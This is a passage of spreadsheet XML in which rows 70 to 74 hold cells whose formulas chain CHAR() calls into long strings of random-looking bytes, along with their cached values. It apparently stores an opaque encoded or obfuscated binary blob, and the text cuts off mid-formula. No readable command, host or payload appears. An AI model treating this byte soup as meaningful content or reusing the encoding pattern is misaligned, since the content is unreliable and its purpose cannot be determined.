        <f>CHAR(198)&amp;CHAR(194)&amp;CHAR(213)&amp;CHAR(179)&amp;CHAR(118)&amp;CHAR(89)&amp;CHAR(181)&amp;CHAR(92)&amp;CHAR(32)&amp;CHAR(156)&amp;CHAR(229)&amp;CHAR(242)&amp;CHAR(162)&amp;CHAR(113)&amp;CHAR(253)&amp;CHAR(1)&amp;CHAR(78)&amp;CHAR(132)&amp;CHAR(194)&amp;CHAR(230)&amp;CHAR(91)&amp;CHAR(43)&amp;CHAR(11)&amp;CHAR(213)&amp;CHAR(74)&amp;CHAR(240)&amp;CHAR(138)&amp;CHAR(45)&amp;CHAR(228)&amp;CHAR(88)&amp;CHAR(136)&amp;CHAR(95)&amp;CHAR(61)&amp;CHAR(85)&amp;CHAR(137)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(232)&amp;CHAR(69)&amp;CHAR(92)&amp;CHAR(228)&amp;CHAR(98)&amp;CHAR(33)&amp;CHAR(70)&amp;CHAR(6)&amp;CHAR(110)&amp;CHAR(234)&amp;CHAR(143)&amp;CHAR(82)&amp;CHAR(252)&amp;CHAR(26)&amp;CHAR(181)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(29)&amp;CHAR(207)&amp;CHAR(34)&amp;CHAR(202)&amp;CHAR(215)&amp;CHAR(235)&amp;CHAR(200)&amp;CHAR(28)&amp;CHAR(65)&amp;CHAR(174)&amp;CHAR(249)&amp;CHAR(249)&amp;CHAR(138)&amp;CHAR(58)&amp;CHAR(128)&amp;CHAR(203)&amp;CHAR(208)&amp;CHAR(49)&amp;CHAR(239)&amp;CHAR(201)&amp;CHAR(34)&amp;CHAR(46)&amp;CHAR(30)&amp;CHAR(201)&amp;CHAR(122)&amp;CHAR(174)&amp;CHAR(215)&amp;CHAR(52)&amp;CHAR(186)&amp;CHAR(216)&amp;CHAR(41)&amp;CHAR(63)&amp;CHAR(236)&amp;CHAR(106)&amp;CHAR(43)&amp;CHAR(132)&amp;CHAR(173)&amp;CHAR(238)&amp;CHAR(103)&amp;CHAR(243)&amp;CHAR(233)&amp;CHAR(111)&amp;CHAR(82)&amp;CHAR(222)&amp;CHAR(236)&amp;CHAR(187)&amp;CHAR(96)&amp;CHAR(183)&amp;CHAR(198)&amp;CHAR(97)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(192)&amp;CHAR(220)&amp;CHAR(10)&amp;CHAR(96)&amp;CHAR(29)&amp;CHAR(121)&amp;CHAR(11)&amp;CHAR(162)&amp;CHAR(32)&amp;CHAR(149)&amp;CHAR(71)&amp;CHAR(47)&amp;CHAR(55)&amp;CHAR(77)&amp;CHAR(238)&amp;CHAR(41)&amp;CHAR(234)&amp;CHAR(223)&amp;CHAR(223)&amp;CHAR(169)&amp;CHAR(141)&amp;CHAR(112)&amp;CHAR(48)&amp;CHAR(109)&amp;CHAR(228)&amp;CHAR(137)&amp;CHAR(137)&amp;CHAR(187)&amp;CHAR(157)&amp;CHAR(1)&amp;CHAR(112)&amp;CHAR(172)&amp;CHAR(218)&amp;CHAR(19)&amp;CHAR(31)&amp;CHAR(170)&amp;CHAR(201)&amp;CHAR(22)&amp;CHAR(16)&amp;CHAR(17)&amp;CHAR(76)&amp;CHAR(103)&amp;CHAR(136)&amp;CHAR(136)&amp;CHAR(42)&amp;CHAR(132)&amp;CHAR(65)&amp;CHAR(106)&amp;CHAR(36)&amp;CHAR(95)&amp;CHAR(238)&amp;CHAR(245)&amp;CHAR(86)&amp;CHAR(53)&amp;CHAR(201)&amp;CHAR(119)&amp;CHAR(35)&amp;CHAR(26)&amp;CHAR(137)&amp;CHAR(5)&amp;CHAR(119)&amp;CHAR(71)&amp;CHAR(104)&amp;CHAR(157)&amp;CHAR(12)&amp;CHAR(97)&amp;CHAR(234)&amp;CHAR(127)&amp;CHAR(164)&amp;CHAR(82)&amp;CHAR(129)&amp;CHAR(124)&amp;CHAR(160)&amp;CHAR(66)&amp;CHAR(74)&amp;CHAR(102)&amp;CHAR(56)&amp;CHAR(128)&amp;CHAR(172)&amp;CHAR(237)&amp;CHAR(198)&amp;CHAR(26)&amp;CHAR(60)&amp;CHAR(20)&amp;CHAR(230)&amp;CHAR(155)&amp;CHAR(15)&amp;CHAR(135)&amp;CHAR(117)&amp;CHAR(12)&amp;CHAR(205)&amp;CHAR(111)&amp;CHAR(223)&amp;CHAR(206)&amp;CHAR(168)&amp;CHAR(170)&amp;CHAR(22)&amp;CHAR(110)&amp;CHAR(76)&amp;CHAR(99)&amp;CHAR(244)&amp;CHAR(172)&amp;CHAR(78)&amp;CHAR(136)&amp;CHAR(220)&amp;CHAR(94)&amp;CHAR(59)&amp;CHAR(210)&amp;CHAR(159)&amp;CHAR(79)&amp;CHAR(186)&amp;CHAR(97)&amp;CHAR(8)&amp;CHAR(235)&amp;CHAR(230)&amp;CHAR(142)&amp;CHAR(80)&amp;CHAR(100)&amp;CHAR(171)&amp;CHAR(47)&amp;CHAR(1)&amp;CHAR(12)&amp;CHAR(61)&amp;CHAR(251)&amp;CHAR(91)&amp;CHAR(145)&amp;CHAR(177)&amp;CHAR(243)&amp;CHAR(230)&amp;CHAR(137)&amp;CHAR(240)&amp;CHAR(57)&amp;CHAR(131)&amp;CHAR(108)&amp;CHAR(194)&amp;CHAR(4)&amp;CHAR(110)&amp;CHAR(168)&amp;CHAR(49)&amp;CHAR(180)&amp;CHAR(93)&amp;CHAR(75)&amp;CHAR(149)&amp;CHAR(51)&amp;CHAR(12)&amp;CHAR(96)&amp;CHAR(244)&amp;CHAR(125)&amp;CHAR(2)</f>
        <v>ÆÂÕ³vYµ\ œåò¢qý_x0001_N„Âæ[+_x000B_ÕJðŠ-äXˆ_=U‰4ÍèE\äb!F_x0006_nêRü_x001A_µ‚_x0002__x001D_Ï"Ê×ëÈ_x001C_A®ùùŠ:€ËÐ1ïÉ"._x001E_Éz®×4ºØ)?ìj+„­îgóéoRÞì»`·Æa_x0004__x0001_ÀÜ
`_x001D_y_x000B_¢ •G/7Mî)êßß©p0mä‰‰»_x0001_p¬Ú_x0013__x001F_ªÉ_x0016__x0010__x0011_Lgˆˆ*„Aj$_îõV5Éw#_x001A_‰_x0005_wGh_x000C_aê¤R| BJf8€¬íÆ_x001A_&lt;_x0014_æ›_x000F_‡u_x000C_ÍoßÎ¨ª_x0016_nLcô¬NˆÜ^;ÒŸOºa_x0008_ëæŽPd«/_x0001__x000C_=û[‘±óæ‰ð9ƒlÂ_x0004_n¨1´]K•3_x000C_`ô}_x0002_</v>
      </c>
      <c r="C70" t="str">
        <f>CHAR(26)&amp;CHAR(89)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(20)&amp;CHAR(50)&amp;CHAR(3)&amp;CHAR(238)&amp;CHAR(180)&amp;CHAR(115)</f>
        <v>_x001A_Y¸ô_x0014_2_x0003_î´s</v>
      </c>
    </row>
    <row r="71" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B71" t="str">
        <f>CHAR(129)&amp;CHAR(183)&amp;CHAR(155)&amp;CHAR(173)&amp;CHAR(138)&amp;CHAR(178)&amp;CHAR(128)&amp;CHAR(66)&amp;CHAR(11)&amp;CHAR(240)&amp;CHAR(216)&amp;CHAR(204)&amp;CHAR(8)&amp;CHAR(1)&amp;CHAR(155)&amp;CHAR(108)&amp;CHAR(244)&amp;CHAR(154)&amp;CHAR(228)&amp;CHAR(239)&amp;CHAR(61)&amp;CHAR(43)&amp;CHAR(41)&amp;CHAR(248)&amp;CHAR(61)&amp;CHAR(171)&amp;CHAR(110)&amp;CHAR(25)&amp;CHAR(120)&amp;CHAR(72)&amp;CHAR(148)&amp;CHAR(53)&amp;CHAR(187)&amp;CHAR(128)&amp;CHAR(215)&amp;CHAR(80)&amp;CHAR(231)&amp;CHAR(59)&amp;CHAR(207)&amp;CHAR(118)&amp;CHAR(156)&amp;CHAR(24)&amp;CHAR(37)&amp;CHAR(201)&amp;CHAR(13)&amp;CHAR(191)&amp;CHAR(119)&amp;CHAR(104)&amp;CHAR(240)&amp;CHAR(37)&amp;CHAR(208)&amp;CHAR(185)&amp;CHAR(65)&amp;CHAR(92)&amp;CHAR(229)&amp;CHAR(233)&amp;CHAR(104)&amp;CHAR(79)&amp;CHAR(43)&amp;CHAR(73)&amp;CHAR(193)&amp;CHAR(209)&amp;CHAR(146)&amp;CHAR(168)&amp;CHAR(236)&amp;CHAR(127)&amp;CHAR(12)&amp;CHAR(186)&amp;CHAR(126)&amp;CHAR(140)&amp;CHAR(92)&amp;CHAR(114)&amp;CHAR(124)&amp;CHAR(201)&amp;CHAR(106)&amp;CHAR(159)&amp;CHAR(61)&amp;CHAR(238)&amp;CHAR(182)&amp;CHAR(35)&amp;CHAR(191)&amp;CHAR(87)&amp;CHAR(243)&amp;CHAR(144)&amp;CHAR(10)&amp;CHAR(246)&amp;CHAR(22)&amp;CHAR(131)&amp;CHAR(144)&amp;CHAR(99)&amp;CHAR(16)&amp;CHAR(161)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(2)&amp;CHAR(24)&amp;CHAR(60)&amp;CHAR(143)&amp;CHAR(251)&amp;CHAR(150)&amp;CHAR(135)&amp;CHAR(120)&amp;CHAR(155)&amp;CHAR(161)&amp;CHAR(78)&amp;CHAR(133)&amp;CHAR(53)&amp;CHAR(51)&amp;CHAR(153)&amp;CHAR(15)&amp;CHAR(103)&amp;CHAR(82)&amp;CHAR(36)&amp;CHAR(225)&amp;CHAR(157)&amp;CHAR(63)&amp;CHAR(95)&amp;CHAR(114)&amp;CHAR(244)&amp;CHAR(169)&amp;CHAR(217)&amp;CHAR(118)&amp;CHAR(89)&amp;CHAR(166)&amp;CHAR(250)&amp;CHAR(148)&amp;CHAR(160)&amp;CHAR(150)&amp;CHAR(209)&amp;CHAR(164)&amp;CHAR(60)&amp;CHAR(204)&amp;CHAR(187)&amp;CHAR(131)&amp;CHAR(137)&amp;CHAR(220)&amp;CHAR(146)&amp;CHAR(205)&amp;CHAR(89)&amp;CHAR(109)&amp;CHAR(51)&amp;CHAR(91)&amp;CHAR(72)&amp;CHAR(201)&amp;CHAR(190)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(202)&amp;CHAR(244)&amp;CHAR(192)&amp;CHAR(100)&amp;CHAR(211)&amp;CHAR(115)&amp;CHAR(82)&amp;CHAR(116)&amp;CHAR(25)&amp;CHAR(203)&amp;CHAR(32)&amp;CHAR(107)&amp;CHAR(184)&amp;CHAR(222)&amp;CHAR(243)&amp;CHAR(254)&amp;CHAR(123)&amp;CHAR(62)&amp;CHAR(105)&amp;CHAR(29)&amp;CHAR(43)&amp;CHAR(173)&amp;CHAR(237)&amp;CHAR(207)&amp;CHAR(106)&amp;CHAR(10)&amp;CHAR(230)&amp;CHAR(99)&amp;CHAR(51)&amp;CHAR(56)&amp;CHAR(136)&amp;CHAR(144)&amp;CHAR(242)&amp;CHAR(145)&amp;CHAR(204)&amp;CHAR(49)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(202)&amp;CHAR(41)&amp;CHAR(95)&amp;CHAR(10)&amp;CHAR(128)&amp;CHAR(50)&amp;CHAR(78)&amp;CHAR(244)&amp;CHAR(5)&amp;CHAR(198)&amp;CHAR(9)&amp;CHAR(74)&amp;CHAR(18)&amp;CHAR(30)&amp;CHAR(6)&amp;CHAR(91)&amp;CHAR(119)&amp;CHAR(152)&amp;CHAR(249)&amp;CHAR(87)&amp;CHAR(89)&amp;CHAR(155)&amp;CHAR(19)&amp;CHAR(249)&amp;CHAR(142)&amp;CHAR(26)&amp;CHAR(220)&amp;CHAR(62)&amp;CHAR(229)&amp;CHAR(163)&amp;CHAR(242)&amp;CHAR(17)&amp;CHAR(31)&amp;CHAR(215)&amp;CHAR(13)&amp;CHAR(223)&amp;CHAR(139)&amp;CHAR(192)&amp;CHAR(216)&amp;CHAR(129)&amp;CHAR(94)&amp;CHAR(169)&amp;CHAR(37)&amp;CHAR(70)&amp;CHAR(34)&amp;CHAR(123)&amp;CHAR(65)&amp;CHAR(129)&amp;CHAR(219)&amp;CHAR(9)&amp;CHAR(54)&amp;CHAR(139)&amp;CHAR(246)&amp;CHAR(154)&amp;CHAR(58)&amp;CHAR(81)&amp;CHAR(51)&amp;CHAR(51)&amp;CHAR(34)&amp;CHAR(41)&amp;CHAR(115)&amp;CHAR(88)&amp;CHAR(67)&amp;CHAR(208)&amp;CHAR(237)&amp;CHAR(85)&amp;CHAR(69)&amp;CHAR(55)&amp;CHAR(72)&amp;CHAR(76)</f>
        <v>·›­Š²€B_x000B_ðØÌ_x0008__x0001_›lôšäï=+)ø=«n_x0019_xH”5»€×Pç;Ïvœ_x0018_%É_x000D_¿whð%Ð¹A\åéhO+IÁÑ’¨ì_x000C_º~Œ\r|ÉjŸ=î¶#¿Wó
ö_x0016_ƒc_x0010_¡ê»_x0002__x0018_&lt;û–‡x›¡N…53™_x000F_gR$á?_rô©ÙvY¦ú” –Ñ¤&lt;Ì»ƒ‰Ü’ÍYm3[HÉ¾Ê‚ÊôÀdÓsRt_x0019_Ë k¸Þóþ{&gt;i_x001D_+­íÏj
æc38ˆò‘Ì1_x0011__x0007_Ê)_
€2Nô_x0005_Æ	J_x0012__x001E__x0006_[w˜ùWY›_x0013_ùŽ_x001A_Ü&gt;å£ò_x0011__x001F_×_x000D_ß‹ÀØ^©%F"{AÛ	6‹öš:Q33")sXCÐíUE7HL</v>
      </c>
      <c r="C71" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(50)&amp;CHAR(11)&amp;CHAR(42)&amp;CHAR(225)&amp;CHAR(19)&amp;CHAR(51)&amp;CHAR(244)</f>
        <v>¸ôq2_x000B_*á_x0013_3ô</v>
      </c>
    </row>
    <row r="72" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B72" t="str">
        <f>CHAR(166)&amp;CHAR(161)&amp;CHAR(116)&amp;CHAR(128)&amp;CHAR(36)&amp;CHAR(16)&amp;CHAR(223)&amp;CHAR(171)&amp;CHAR(175)&amp;CHAR(127)&amp;CHAR(254)&amp;CHAR(248)&amp;CHAR(169)&amp;CHAR(83)&amp;CHAR(134)&amp;CHAR(50)&amp;CHAR(63)&amp;CHAR(44)&amp;CHAR(118)&amp;CHAR(14)&amp;CHAR(12)&amp;CHAR(23)&amp;CHAR(53)&amp;CHAR(132)&amp;CHAR(214)&amp;CHAR(7)&amp;CHAR(136)&amp;CHAR(207)&amp;CHAR(119)&amp;CHAR(237)&amp;CHAR(189)&amp;CHAR(244)&amp;CHAR(245)&amp;CHAR(50)&amp;CHAR(1)&amp;CHAR(149)&amp;CHAR(210)&amp;CHAR(89)&amp;CHAR(18)&amp;CHAR(90)&amp;CHAR(25)&amp;CHAR(63)&amp;CHAR(105)&amp;CHAR(6)&amp;CHAR(59)&amp;CHAR(41)&amp;CHAR(135)&amp;CHAR(20)&amp;CHAR(73)&amp;CHAR(31)&amp;CHAR(212)&amp;CHAR(226)&amp;CHAR(78)&amp;CHAR(250)&amp;CHAR(51)&amp;CHAR(239)&amp;CHAR(2)&amp;CHAR(177)&amp;CHAR(255)&amp;CHAR(139)&amp;CHAR(66)&amp;CHAR(89)&amp;CHAR(233)&amp;CHAR(78)&amp;CHAR(63)&amp;CHAR(4)&amp;CHAR(71)&amp;CHAR(241)&amp;CHAR(10)&amp;CHAR(89)&amp;CHAR(81)&amp;CHAR(182)&amp;CHAR(31)&amp;CHAR(81)&amp;CHAR(231)&amp;CHAR(177)&amp;CHAR(12)&amp;CHAR(215)&amp;CHAR(116)&amp;CHAR(18)&amp;CHAR(3)&amp;CHAR(240)&amp;CHAR(248)&amp;CHAR(155)&amp;CHAR(39)&amp;CHAR(50)&amp;CHAR(100)&amp;CHAR(83)&amp;CHAR(24)&amp;CHAR(99)&amp;CHAR(162)&amp;CHAR(253)&amp;CHAR(109)&amp;CHAR(231)&amp;CHAR(80)&amp;CHAR(29)&amp;CHAR(6)&amp;CHAR(247)&amp;CHAR(170)&amp;CHAR(168)&amp;CHAR(132)&amp;CHAR(156)&amp;CHAR(249)&amp;CHAR(19)&amp;CHAR(124)&amp;CHAR(180)&amp;CHAR(225)&amp;CHAR(167)&amp;CHAR(155)&amp;CHAR(253)&amp;CHAR(237)&amp;CHAR(131)&amp;CHAR(146)&amp;CHAR(239)&amp;CHAR(66)&amp;CHAR(245)&amp;CHAR(204)&amp;CHAR(108)&amp;CHAR(41)&amp;CHAR(97)&amp;CHAR(50)&amp;CHAR(176)&amp;CHAR(83)&amp;CHAR(207)&amp;CHAR(155)&amp;CHAR(214)&amp;CHAR(47)&amp;CHAR(110)&amp;CHAR(56)&amp;CHAR(187)&amp;CHAR(171)&amp;CHAR(95)&amp;CHAR(249)&amp;CHAR(61)&amp;CHAR(249)&amp;CHAR(172)&amp;CHAR(37)&amp;CHAR(247)&amp;CHAR(209)&amp;CHAR(64)&amp;CHAR(50)&amp;CHAR(231)&amp;CHAR(67)&amp;CHAR(177)&amp;CHAR(43)&amp;CHAR(87)&amp;CHAR(188)&amp;CHAR(151)&amp;CHAR(188)&amp;CHAR(146)&amp;CHAR(81)&amp;CHAR(121)&amp;CHAR(196)&amp;CHAR(240)&amp;CHAR(128)&amp;CHAR(102)&amp;CHAR(13)&amp;CHAR(158)&amp;CHAR(171)&amp;CHAR(230)&amp;CHAR(50)&amp;CHAR(7)&amp;CHAR(223)&amp;CHAR(84)&amp;CHAR(60)&amp;CHAR(106)&amp;CHAR(128)&amp;CHAR(235)&amp;CHAR(177)&amp;CHAR(247)&amp;CHAR(165)&amp;CHAR(227)&amp;CHAR(58)&amp;CHAR(87)&amp;CHAR(126)&amp;CHAR(179)&amp;CHAR(144)&amp;CHAR(95)&amp;CHAR(34)&amp;CHAR(60)&amp;CHAR(43)&amp;CHAR(210)&amp;CHAR(169)&amp;CHAR(189)&amp;CHAR(148)&amp;CHAR(1)&amp;CHAR(126)&amp;CHAR(202)&amp;CHAR(5)&amp;CHAR(255)&amp;CHAR(39)&amp;CHAR(45)&amp;CHAR(209)&amp;CHAR(109)&amp;CHAR(41)&amp;CHAR(154)&amp;CHAR(70)&amp;CHAR(58)&amp;CHAR(198)&amp;CHAR(194)&amp;CHAR(253)&amp;CHAR(14)&amp;CHAR(100)&amp;CHAR(196)&amp;CHAR(166)&amp;CHAR(127)&amp;CHAR(100)&amp;CHAR(86)&amp;CHAR(178)&amp;CHAR(8)&amp;CHAR(180)&amp;CHAR(20)&amp;CHAR(239)&amp;CHAR(209)&amp;CHAR(150)&amp;CHAR(76)&amp;CHAR(201)&amp;CHAR(72)&amp;CHAR(36)&amp;CHAR(5)&amp;CHAR(89)&amp;CHAR(102)&amp;CHAR(125)&amp;CHAR(199)&amp;CHAR(111)&amp;CHAR(75)&amp;CHAR(160)&amp;CHAR(77)&amp;CHAR(165)&amp;CHAR(34)&amp;CHAR(240)&amp;CHAR(83)&amp;CHAR(156)&amp;CHAR(13)&amp;CHAR(37)&amp;CHAR(92)&amp;CHAR(136)&amp;CHAR(145)&amp;CHAR(189)&amp;CHAR(212)&amp;CHAR(220)&amp;CHAR(35)&amp;CHAR(79)&amp;CHAR(67)&amp;CHAR(82)&amp;CHAR(196)&amp;CHAR(152)&amp;CHAR(140)&amp;CHAR(199)&amp;CHAR(4)&amp;CHAR(190)&amp;CHAR(38)&amp;CHAR(224)&amp;CHAR(13)&amp;CHAR(130)</f>
        <v>¦¡t€$_x0010_ß«¯þø©S†2?,v_x000E__x000C__x0017_5„Ö_x0007_ˆÏwí½ôõ2_x0001_•ÒY_x0012_Z_x0019_?i_x0006_;)‡_x0014_I_x001F_ÔâNú3ï_x0002_±ÿ‹BYéN?_x0004_Gñ
YQ¶_x001F_Qç±_x000C_×t_x0012__x0003_ðø›'2dS_x0018_c¢ýmçP_x001D__x0006_÷ª¨„œù_x0013_|´á§›ýíƒ’ïBõÌl)a2°SÏ›Ö/n8»«_ù=ù¬%÷Ñ@2çC±+W¼—¼’QyÄð€f_x000D_ž«æ2_x0007_ßT&lt;j€ë±÷¥ã:W~³_"&lt;+Ò©½”_x0001_~Ê_x0005_ÿ'-Ñm)šF:ÆÂý_x000E_dÄ¦dV²_x0008_´_x0014_ïÑ–LÉH$_x0005_Yf}ÇoK M¥"ðSœ_x000D_%\ˆ‘½ÔÜ#OCRÄ˜ŒÇ_x0004_¾&amp;à_x000D_‚</v>
      </c>
      <c r="C72" t="str">
        <f>CHAR(57)&amp;CHAR(241)&amp;CHAR(136)&amp;CHAR(143)&amp;CHAR(221)&amp;CHAR(208)&amp;CHAR(188)&amp;CHAR(209)&amp;CHAR(89)&amp;CHAR(122)</f>
        <v>9ñˆÝÐ¼ÑYz</v>
      </c>
    </row>
    <row r="73" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B73" t="str">
        <f>CHAR(183)&amp;CHAR(177)&amp;CHAR(79)&amp;CHAR(126)&amp;CHAR(178)&amp;CHAR(35)&amp;CHAR(38)&amp;CHAR(200)&amp;CHAR(73)&amp;CHAR(243)&amp;CHAR(247)&amp;CHAR(109)&amp;CHAR(236)&amp;CHAR(163)&amp;CHAR(50)&amp;CHAR(174)&amp;CHAR(57)&amp;CHAR(52)&amp;CHAR(210)&amp;CHAR(161)&amp;CHAR(156)&amp;CHAR(122)&amp;CHAR(70)&amp;CHAR(115)&amp;CHAR(113)&amp;CHAR(40)&amp;CHAR(77)&amp;CHAR(68)&amp;CHAR(21)&amp;CHAR(86)&amp;CHAR(90)&amp;CHAR(164)&amp;CHAR(64)&amp;CHAR(240)&amp;CHAR(29)&amp;CHAR(199)&amp;CHAR(7)&amp;CHAR(204)&amp;CHAR(57)&amp;CHAR(13)&amp;CHAR(85)&amp;CHAR(188)&amp;CHAR(184)&amp;CHAR(14)&amp;CHAR(150)&amp;CHAR(122)&amp;CHAR(23)&amp;CHAR(149)&amp;CHAR(195)&amp;CHAR(168)&amp;CHAR(164)&amp;CHAR(219)&amp;CHAR(225)&amp;CHAR(163)&amp;CHAR(188)&amp;CHAR(69)&amp;CHAR(152)&amp;CHAR(129)&amp;CHAR(88)&amp;CHAR(157)&amp;CHAR(72)&amp;CHAR(157)&amp;CHAR(162)&amp;CHAR(27)&amp;CHAR(9)&amp;CHAR(157)&amp;CHAR(241)&amp;CHAR(112)&amp;CHAR(253)&amp;CHAR(143)&amp;CHAR(57)&amp;CHAR(130)&amp;CHAR(227)&amp;CHAR(28)&amp;CHAR(191)&amp;CHAR(32)&amp;CHAR(160)&amp;CHAR(107)&amp;CHAR(111)&amp;CHAR(176)&amp;CHAR(211)&amp;CHAR(91)&amp;CHAR(228)&amp;CHAR(16)&amp;CHAR(180)&amp;CHAR(1)&amp;CHAR(183)&amp;CHAR(249)&amp;CHAR(179)&amp;CHAR(44)&amp;CHAR(188)&amp;CHAR(127)&amp;CHAR(245)&amp;CHAR(210)&amp;CHAR(136)&amp;CHAR(170)&amp;CHAR(7)&amp;CHAR(248)&amp;CHAR(136)&amp;CHAR(53)&amp;CHAR(22)&amp;CHAR(116)&amp;CHAR(136)&amp;CHAR(93)&amp;CHAR(71)&amp;CHAR(240)&amp;CHAR(5)&amp;CHAR(138)&amp;CHAR(247)&amp;CHAR(206)&amp;CHAR(26)&amp;CHAR(130)&amp;CHAR(98)&amp;CHAR(173)&amp;CHAR(159)&amp;CHAR(239)&amp;CHAR(170)&amp;CHAR(238)&amp;CHAR(182)&amp;CHAR(111)&amp;CHAR(202)&amp;CHAR(55)&amp;CHAR(52)&amp;CHAR(235)&amp;CHAR(73)&amp;CHAR(4)&amp;CHAR(231)&amp;CHAR(124)&amp;CHAR(193)&amp;CHAR(249)&amp;CHAR(228)&amp;CHAR(149)&amp;CHAR(192)&amp;CHAR(209)&amp;CHAR(164)&amp;CHAR(56)&amp;CHAR(40)&amp;CHAR(2)&amp;CHAR(240)&amp;CHAR(252)&amp;CHAR(103)&amp;CHAR(88)&amp;CHAR(89)&amp;CHAR(242)&amp;CHAR(86)&amp;CHAR(114)&amp;CHAR(186)&amp;CHAR(98)&amp;CHAR(67)&amp;CHAR(65)&amp;CHAR(193)&amp;CHAR(133)&amp;CHAR(99)&amp;CHAR(11)&amp;CHAR(48)&amp;CHAR(87)&amp;CHAR(10)&amp;CHAR(138)&amp;CHAR(67)&amp;CHAR(18)&amp;CHAR(106)&amp;CHAR(212)&amp;CHAR(155)&amp;CHAR(89)&amp;CHAR(112)&amp;CHAR(18)&amp;CHAR(208)&amp;CHAR(29)&amp;CHAR(28)&amp;CHAR(141)&amp;CHAR(166)&amp;CHAR(5)&amp;CHAR(179)&amp;CHAR(166)&amp;CHAR(103)&amp;CHAR(12)&amp;CHAR(109)&amp;CHAR(3)&amp;CHAR(94)&amp;CHAR(56)&amp;CHAR(36)&amp;CHAR(88)&amp;CHAR(39)&amp;CHAR(49)&amp;CHAR(121)&amp;CHAR(110)&amp;CHAR(106)&amp;CHAR(210)&amp;CHAR(124)&amp;CHAR(48)&amp;CHAR(95)&amp;CHAR(220)&amp;CHAR(21)&amp;CHAR(5)&amp;CHAR(216)&amp;CHAR(13)&amp;CHAR(32)&amp;CHAR(34)&amp;CHAR(178)&amp;CHAR(63)&amp;CHAR(146)&amp;CHAR(79)&amp;CHAR(162)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(253)&amp;CHAR(181)&amp;CHAR(93)&amp;CHAR(151)&amp;CHAR(255)&amp;CHAR(119)&amp;CHAR(163)&amp;CHAR(223)&amp;CHAR(118)&amp;CHAR(218)&amp;CHAR(92)&amp;CHAR(171)&amp;CHAR(104)&amp;CHAR(56)&amp;CHAR(218)&amp;CHAR(2)&amp;CHAR(16)&amp;CHAR(8)&amp;CHAR(233)&amp;CHAR(215)&amp;CHAR(97)&amp;CHAR(52)&amp;CHAR(208)&amp;CHAR(205)&amp;CHAR(120)&amp;CHAR(69)&amp;CHAR(248)&amp;CHAR(204)&amp;CHAR(110)&amp;CHAR(147)&amp;CHAR(103)&amp;CHAR(240)&amp;CHAR(27)&amp;CHAR(132)&amp;CHAR(90)&amp;CHAR(71)&amp;CHAR(56)&amp;CHAR(214)&amp;CHAR(176)&amp;CHAR(219)&amp;CHAR(203)&amp;CHAR(177)&amp;CHAR(184)&amp;CHAR(10)&amp;CHAR(187)&amp;CHAR(114)&amp;CHAR(28)&amp;CHAR(89)&amp;CHAR(100)&amp;CHAR(83)</f>
        <v>·±O~²#&amp;ÈIó÷mì£2®94Ò¡œzFsq(MD_x0015_VZ¤@ð_x001D_Ç_x0007_Ì9_x000D_U¼¸_x000E_–z_x0017_•Ã¨¤Ûá£¼E˜XH¢_x001B_	ñpý9‚ã_x001C_¿  ko°Ó[ä_x0010_´_x0001_·ù³,¼õÒˆª_x0007_øˆ5_x0016_tˆ]Gð_x0005_Š÷Î_x001A_‚b­Ÿïªî¶oÊ74ëI_x0004_ç|Áùä•ÀÑ¤8(_x0002_ðügXYòVrºbCAÁ…c_x000B_0W
ŠC_x0012_jÔ›Yp_x0012_Ð_x001D__x001C_¦_x0005_³¦g_x000C_m_x0003_^8$X'1ynjÒ|0_Ü_x0015__x0005_Ø_x000D_ "²?’O¢_x0006__x0001_ýµ]—ÿw£ßvÚ\«h8Ú_x0002__x0010__x0008_é×a4ÐÍxEøÌn“gð_x001B_„ZG8Ö°ÛË±¸
»r_x001C_YdS</v>
      </c>
      <c r="C73" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(216)&amp;CHAR(216)&amp;CHAR(120)&amp;CHAR(140)&amp;CHAR(57)&amp;CHAR(247)&amp;CHAR(157)&amp;CHAR(202)</f>
        <v>ˆêØØxŒ9÷Ê</v>
      </c>
    </row>
    <row r="74" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B74" t="str">
        <f>CHAR(44)&amp;CHAR(187)&amp;CHAR(236)&amp;CHAR(219)&amp;CHAR(120)&amp;CHAR(128)&amp;CHAR(155)&amp;CHAR(190)&amp;CHAR(50)&amp;CHAR(104)&amp;CHAR(27)&amp;CHAR(234)&amp;CHAR(52)&amp;CHAR(196)&amp;CHAR(52)&amp;CHAR(246)&amp;CHAR(245)&amp;CHAR(75)&amp;CHAR(1)&amp;CHAR(143)&amp;CHAR(201)&amp;CHAR(108)&amp;CHAR(232)&amp;CHAR(16)&amp;CHAR(235)&amp;CHAR(12)&amp;CHAR(110)&amp;CHAR(129)&amp;CHAR(197)&amp;CHAR(142)&amp;CHAR(43)&amp;CHAR(38)&amp;CHAR(63)&amp;CHAR(84)&amp;CHAR(185)&amp;CHAR(114)&amp;CHAR(173)&amp;CHAR(204)&amp;CHAR(164)&amp;CHAR(190)&amp;CHAR(20)&amp;CHAR(179)&amp;CHAR(32)&amp;CHAR(241)&amp;CHAR(149)&amp;CHAR(211)&amp;CHAR(68)&amp;CHAR(157)&amp;CHAR(200)&amp;CHAR(46)&amp;CHAR(203)&amp;CHAR(201)&amp;CHAR(101)&amp;CHAR(5)&amp;CHAR(102)&amp;CHAR(197)&amp;CHAR(80)&amp;CHAR(22)&amp;CHAR(77)&amp;CHAR(91)&amp;CHAR(90)&amp;CHAR(26)&amp;CHAR(119)&amp;CHAR(39)&amp;CHAR(176)&amp;CHAR(13)&amp;CHAR(51)&amp;CHAR(1)&amp;CHAR(41)&amp;CHAR(45)&amp;CHAR(30)&amp;CHAR(107)&amp;CHAR(129)&amp;CHAR(127)&amp;CHAR(25)&amp;CHAR(10)&amp;CHAR(64)&amp;CHAR(181)&amp;CHAR(37)&amp;CHAR(176)&amp;CHAR(236)&amp;CHAR(6)&amp;CHAR(191)&amp;CHAR(27)&amp;CHAR(57)&amp;CHAR(12)&amp;CHAR(85)&amp;CHAR(38)&amp;CHAR(40)&amp;CHAR